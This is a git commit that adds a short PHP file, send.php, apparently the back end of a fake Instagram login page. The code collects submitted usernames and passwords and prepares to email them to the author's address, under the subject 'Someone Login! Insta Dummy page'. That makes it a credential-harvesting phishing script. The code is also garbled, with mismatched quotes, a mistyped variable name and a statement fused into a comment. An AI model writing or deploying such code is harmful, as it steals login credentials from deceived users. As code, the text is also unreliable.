134c462c19d78cc0ebcf3a45eeac27afd92c4eb7
AdityaSingham <126844626+AdityaSingham@users.noreply.github.com>
2023-03-03 09:17:30 +0530

    Add files via upload

---
+++ send.php
@@ -0,0 +1,9 @@
+<?php
+
+//varible setting
+
+$username = $_REQUEST['u_name"]; // fetch username
+
+Spasscode= $_REQUEST['pass']; // fetch password $subject "Someone Login! Insta Dummy page";
+
+$to ="adityasingham1427@gmail.com";
